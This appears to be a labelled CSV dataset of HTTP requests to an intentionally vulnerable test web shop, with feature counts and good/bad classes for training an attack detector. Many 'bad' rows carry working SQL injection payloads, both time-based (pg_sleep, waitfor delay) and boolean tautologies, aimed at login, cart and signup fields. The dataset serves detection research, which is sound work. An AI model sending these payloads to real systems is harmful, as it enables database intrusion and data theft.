,method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class,Cluster
40362,POST,/AJAX/showxml.php,FLRlfCqb');select pg_sleep(3); -- ,1.0,0.0,1.0,1.0,3.0,2.0,bad,Cluster 1
40363,GET,/version,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40364,GET,/secured/phpinfo.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40365,GET,/hpp/params.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40366,GET,/comment.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40367,GET,/AJAX/infotitle.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40368,GET,/search.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40369,GET,/guestbook.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40370,POST,/secured/newuser.php,signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=xcrbB0XV');select%20pg_sleep(6);%20--%20&urname=zFPWdwPk&uuname=zFPWdwPk,1.0,0.0,1.0,1.0,5.0,2.0,bad,Cluster 1
40371,GET,/cart.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40372,POST,/comment.php,Submit=Submit&comment=1&name=1ACUSTART%20ACUEND&phpaction=echo%20%24_POST[comment];,0.0,0.0,0.0,0.0,2.0,0.0,bad,Cluster 0
40373,GET,/hpp/index.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40374,GET,/api.github.com/repos/sebastianbergmann/code-unit-reverse-lookup/zipball/1de8cd5c010cb153fcd68b8d0f64606f523f7619,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40375,GET,/artists.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40376,GET,/AJAX/infoartist.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40377,GET,/redir.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40378,POST,/cart.php,addcart=-1'%20OR%203%2B531-531-1=0%2B0%2B0%2B1%20or%20'KJvqcS4U'='&price=460,4.0,0.0,0.0,0.0,4.0,0.0,bad,Cluster 1
40379,GET,/hpp/params.php?aaaa=,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40380,GET,/redir.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40381,GET,/%F1%AF%CBf%B4%CAdQK%14%8F,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40382,GET,/userinfo.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40383,GET,/guestbook.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40384,GET,/guestbook.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40385,GET,/artists.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40386,GET,/vendor/verot.net,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40387,GET,/AJAX/showxml.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40388,GET,/AJAX/infotitle.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40389,GET,/guestbook.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40390,GET,/showimage.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40391,GET,/comment.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40392,GET,/userinfo.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40393,GET,/Mod_Rewrite_Shop/Details/color-printer/3/index.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40394,GET,/vendor/,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40395,GET,/product.php?pic=-1%20OR%203%2B466-466-1=0%2B0%2B0%2B1%20--%20,,0.0,0.0,1.0,0.0,4.0,0.0,bad,Cluster 1
40396,POST,/guestbook.php,submit=add%20message&name=anonymous%20user&text=1,0.0,0.0,0.0,0.0,2.0,0.0,bad,Cluster 0
40397,GET,/hpp/index.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40398,GET,/comment.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40399,GET,/product.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40400,GET,/listproducts.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40401,POST,/userinfo.php,pass=g00dPa%24%24w0rD&uname=-1'%20OR%203%2B588-588-1=0%2B0%2B0%2B1%20--%20,1.0,0.0,1.0,0.0,4.0,0.0,bad,Cluster 1
40402,POST,/cart.php,addcart=1ACUSTART%5C&price=500,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40403,GET,/cart.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40404,GET,/redir.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40405,GET,/AJAX/showxml.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40406,GET,/search.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40407,GET,/%E1ksY%AA%D2N%DD%D4%9D4%1F%9E%94%C6%BC%A63%80%BB%C3,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40408,POST,/userinfo.php,pass=g00dPa%24%24w0rD&uname=-1'%20OR%202%2B588-588-1=0%2B0%2B0%2B1%20--%20,1.0,0.0,1.0,0.0,4.0,0.0,bad,Cluster 1
40409,GET,/userinfo.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40410,GET,/showimage.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40411,GET,/bxss/vuln.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40412,GET,/AJAX/showxml.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40413,GET,/secured/phpinfo.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40414,POST,/AJAX/showxml.php,zeZF78ln'));select pg_sleep(6); -- ,1.0,0.0,1.0,1.0,3.0,2.0,bad,Cluster 1
40415,GET,/PHP,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40416,GET,/listproducts.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40417,POST,/cart.php,addcart=5&price=-1;select%20pg_sleep(3);%20--%20,0.0,0.0,1.0,1.0,3.0,2.0,bad,Cluster 1
40418,GET,/redir.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40419,GET,/bxss/vuln.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40420,GET,/www.phpdoc.org,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40421,GET,/comment.php?pid=7,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40422,GET,/comment.php?aid=OaZfk8zo'));select%20pg_sleep(6);%20--%20,,1.0,0.0,1.0,1.0,3.0,2.0,bad,Cluster 1
40423,GET,/secured/phpinfo.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40424,GET,/vendor/rine-project.org/p,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40425,GET,/AJAX/infotitle.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40426,POST,/AJAX/infotitle.php,id=1%20AND%203*2*1=6%20AND%20106=106,0.0,0.0,0.0,0.0,4.0,0.0,bad,Cluster 0
40427,GET,/vendor/hpspec/prophecy.git,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40428,GET,/showimage.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40429,GET,/redir.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40430,GET,/comment.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40431,GET,/showimage.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40432,GET,/redir.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40433,GET,/comment.php?pid=6,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40434,GET,/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/details.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40435,GET,/AJAX/infocateg.php?id=11*5*2*999,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40436,GET,/AJAX/showxml.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40437,POST,/cart.php,addcart=2&price=-1;%20waitfor%20delay%20'0:0:9'%20--%20,2.0,0.0,1.0,0.0,5.0,2.0,bad,Cluster 1
40438,GET,/AJAX/showxml.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40439,POST,/guestbook.php,submit=add%20message&name=-1%20OR%202%2B726-726-1=0%2B0%2B0%2B1&text=1,0.0,0.0,0.0,0.0,3.0,0.0,bad,Cluster 0
40440,GET,/bxss/vuln.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40441,GET,/comment.php?pid=-1'%20OR%202%2B103-103-1=0%2B0%2B0%2B1%20--%20,,1.0,0.0,1.0,0.0,4.0,0.0,bad,Cluster 1
40442,POST,/guestbook.php,submit=add%20message&name=anonymous%20user&text=-1;%20waitfor%20delay%20'0:0:9'%20--%20,2.0,0.0,1.0,0.0,7.0,2.0,bad,Cluster 1
40443,GET,/listproducts.php?artist=-1%20OR%203*2*0=6%20AND%20000462=000462,,0.0,0.0,0.0,0.0,4.0,0.0,bad,Cluster 0
40444,GET,/AJAX/showxml.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40445,GET,/hpp/params.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40446,GET,/cart.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40447,GET,/redir.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40448,GET,/listproducts.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40449,GET,/showimage.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40450,GET,/phpspec,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40451,GET,/showimage.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40452,GET,/AJAX/infocateg.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40453,GET,/redir.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40454,GET,/AJAX/infotitle.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40455,GET,/hpp/index.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40456,GET,/redir.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40457,GET,/api.github.com/repos/sebastianbergmann/global-state/zipball/bc37d50fea7d017d3d340f230811c9f1d7280af4,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40458,GET,/secured/newuser.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40459,GET,/product.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40460,GET,/hpp/index.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40461,GET,/hpp/params.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40462,POST,/search.php?test=-1%20OR%202%2B786-786-1=0%2B0%2B0%2B1,goButton=go&searchFor=the,0.0,0.0,0.0,0.0,2.0,0.0,bad,Cluster 0
40463,GET,/redir.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40464,GET,/AJAX/infotitle.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40465,GET,/AJAX/infoartist.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40466,GET,/hpp/params.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40467,GET,/showimage.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40468,GET,/github.com/sebastianbergmann/exporter.git,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40469,GET,"/showimage.php?file=./pictures/1.jpg""%20AND%202*3*8=6*8%20AND%20""wL25""=""wL25&size=160",,0.0,4.0,0.0,0.0,4.0,0.0,bad,Cluster 1
40470,GET,/secured/phpinfo.php?=J0WweGA9';select%20pg_sleep(3);%20--%20,,1.0,0.0,1.0,1.0,3.0,2.0,bad,Cluster 1
40471,GET,/hpp/params.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40472,GET,/hpp/,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40473,GET,/AJAX/infoartist.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40474,POST,/cart.php,addcart=VWmBRgrt&price=986,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40475,GET,/comment.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40476,POST,/cart.php,addcart=6&price=-1'%20OR%202%2B66-66-1=0%2B0%2B0%2B1%20--%20,1.0,0.0,1.0,0.0,4.0,0.0,bad,Cluster 1
40477,GET,/hpp/params.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40478,GET,/hpp/,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40479,GET,/product.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40480,GET,/product.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40481,POST,/secured/newuser.php,signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=FuRjSp8Z&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=zFPWdwPk&uuname=zFPWdwPk,0.0,0.0,0.0,0.0,2.0,0.0,bad,Cluster 0
40482,GET,/hpp/,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40483,GET,/secured/phpinfo.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40484,GET,/listproducts.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40485,GET,/search.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40486,GET,/secured/phpinfo.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40487,GET,/product.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40488,GET,/listproducts.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40489,GET,/hpp/index.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40490,GET,/hpp/params.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40491,GET,/secured/newuser.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40492,POST,/cart.php,addcart=-1%20OR%202%2B45-45-1=0%2B0%2B0%2B1%20--%20&price=10000,0.0,0.0,1.0,0.0,4.0,0.0,bad,Cluster 1
40493,GET,/cart.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40494,POST,/cart.php,addcart=1&price=1ACUSTART%20ACUEND,0.0,0.0,0.0,0.0,1.0,0.0,bad,Cluster 0
40495,GET,/product.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40496,POST,/cart.php,"addcart=-1""%20OR%203*2>(0%2B5%2B769-769)%20--%20&price=10000",0.0,1.0,1.0,1.0,4.0,0.0,bad,Cluster 1
40497,GET,/userinfo.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40498,POST,/cart.php,addcart=11xQBa8W';select%20pg_sleep(3);%20--%20&price=800,1.0,0.0,1.0,1.0,3.0,2.0,bad,Cluster 1
40499,GET,/cart.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40500,GET,/%D3%80/D]%B4%C8%B6%CD%C0%135%00,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40501,GET,/Connections/DB_Connection.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40502,GET,/AJAX/infotitle.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40503,GET,/search.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40504,GET,/product.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40505,GET,/showimage.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40506,GET,/AJAX/infoartist.php?id=1*1*1*1,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40507,GET,/guestbook.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40508,POST,/guestbook.php,"1ACUSTART'""kzlTgACUEND&name=anonymous%20user&text=1",1.0,1.0,0.0,0.0,1.0,0.0,bad,Cluster 0
40509,GET,/search.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40510,GET,/product.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40511,GET,/secured/phpinfo.php?=1%20waitfor%20delay%20'0:0:3'%20--%20,,2.0,0.0,1.0,0.0,5.0,2.0,bad,Cluster 1
40512,GET,/AJAX/infocateg.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40513,GET,/product.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40514,GET,/secured/newuser.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40515,GET,/secured/newuser.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40516,GET,/AJAX/infocateg.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40517,POST,/cart.php,addcart=-1%20OR%202%2B769-769-1=0%2B0%2B0%2B1%20--%20&price=800,0.0,0.0,1.0,0.0,4.0,0.0,bad,Cluster 1
40518,GET,/search.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40519,GET,/artists.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40520,GET,/AJAX/infotitle.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40521,GET,/AJAX/infocateg.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40522,GET,/hpp/,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40523,GET,/guestbook.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40524,GET,/AJAX/infocateg.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40525,GET,/userinfo.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40526,GET,/AJAX/infotitle.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40527,GET,/hpp/params.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40528,GET,/AJAX/showxml.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40529,POST,/secured/newuser.php,"signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=g00dPa%24%24w0rD&upass2=1ACUSTART'""sc9sZACUEND&uphone=555-666-0606&urname=zFPWdwPk&uuname=zFPWdwPk",1.0,1.0,0.0,0.0,2.0,0.0,bad,Cluster 0
40530,GET,/api.github.com/repos/symfony/polyfill-ctype/zipball/30885182c981ab175d4d034db0f6f469898070ab,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40531,GET,/AJAX/showxml.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40532,GET,/showimage.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40533,POST,/secured/newuser.php,1ACUSTART%20ACUEND&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=555-666-0606&urname=zFPWdwPk&uuname=zFPWdwPk,0.0,0.0,0.0,0.0,3.0,0.0,bad,Cluster 0
40534,GET,/secured/phpinfo.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40535,GET,/bxss/index.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40536,GET,/AJAX/infotitle.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40537,GET,/hpp/index.php?pp=IrNRjSod,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40538,GET,"/secured/phpinfo.php?=(select(0)from(select(sleep(3)))v)/*'%2B(select(0)from(select(sleep(3)))v)%2B'""%2B(select(0)from(select(sleep(3)))v)%2B""*/",,2.0,2.0,0.0,15.0,0.0,9.0,bad,Cluster 1
40539,GET,/secured/phpinfo.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40540,GET,/comment.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40541,GET,/redir.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40542,GET,/artists.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40543,GET,/bxss/vuln.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40544,GET,/AJAX/infoartist.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40545,GET,/hpp/params.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40546,GET,/hpp/index.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40547,GET,/userinfo.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40548,GET,/%97i%F1,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40549,GET,/sitemap.xml,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40550,GET,/AJAX/infotitle.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40551,GET,/artists.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40552,POST,/secured/newuser.php,signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=g00dPa%24%24w0rD&upass2=g00dPa%24%24w0rD&uphone=-1%20OR%202%2B846-846-1=0%2B0%2B0%2B1%20--%20&urname=zFPWdwPk&uuname=zFPWdwPk,0.0,0.0,1.0,0.0,6.0,0.0,bad,Cluster 1
40553,GET,/AJAX/infocateg.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40554,GET,/hpp/,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40555,GET,/guestbook.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40556,GET,/artists.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40557,GET,/secured/newuser.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40558,GET,/search.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40559,GET,/product.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40560,GET,/showimage.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40561,POST,/comment.php,Submit=Submit&comment=1ACUSTART%20ACUEND&name=<your%20name%20here>&phpaction=echo%20%24_POST[comment];,0.0,0.0,0.0,0.0,4.0,0.0,bad,Cluster 0
40562,GET,/showimage.php?file=1ACUSTART%5C&size=160,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40563,GET,/cart.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40564,GET,/artists.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40565,GET,/AJAX/showxml.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40566,GET,/product.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40567,GET,/%000%001%002%003%004%005%006%007%008%009%00:%00,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40568,GET,/product.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40569,GET,/listproducts.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40570,GET,/bxss/vuln.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40571,GET,/showimage.php?file=-1%20OR%203%2B115-115-1=0%2B0%2B0%2B1%20--%20,,0.0,0.0,1.0,0.0,4.0,0.0,bad,Cluster 1
40572,POST,/cart.php,addcart=6&price=Eea18rGo'));select%20pg_sleep(6);%20--%20,1.0,0.0,1.0,1.0,3.0,2.0,bad,Cluster 1
40573,GET,/showimage.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40574,GET,/secured/newuser.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40575,GET,/AJAX/infotitle.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40576,GET,/AJAX/showxml.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40577,GET,/listproducts.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40578,GET,/redir.php?r=http://www.eclectasy.com/Fractal-Explorer/index.html%00%00%00%00%00%00%00%40%00%40%00%89%06,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40579,GET,/comment.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40580,GET,/AJAX/infotitle.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40581,GET,/hpp/index.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40582,GET,/comment.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40583,GET,/vendor/marcello.duar,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40584,GET,/artists.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40585,GET,/bxss/vuln.php?id=SuCxzqcH';select%20pg_sleep(3);%20--%20,,1.0,0.0,1.0,1.0,3.0,2.0,bad,Cluster 1
40586,GET,/hpp/params.php?p=valid&pp=0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z,,2.0,0.0,0.0,5.0,0.0,1.0,bad,Cluster 0
40587,GET,/bxss/vuln.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40588,GET,/AJAX/infotitle.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40589,GET,/hpp/index.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40590,GET,/listproducts.php?artist=-1%20OR%203*2>(0%2B5%2B129-129),,0.0,0.0,0.0,1.0,2.0,0.0,bad,Cluster 0
40591,GET,/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40592,GET,/comment.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40593,GET,/listproducts.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40594,GET,/listproducts.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40595,GET,/hpp/params.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40596,GET,/cart.php,,0.0,0.0,0.0,0.0,0.0,0.0,good,Cluster 0
40597,POST,/cart.php,addcart=2&price=-1);select%20pg_sleep(6);%20--%20,0.0,0.0,1.0,1.0,3.0,2.0,bad,Cluster 1
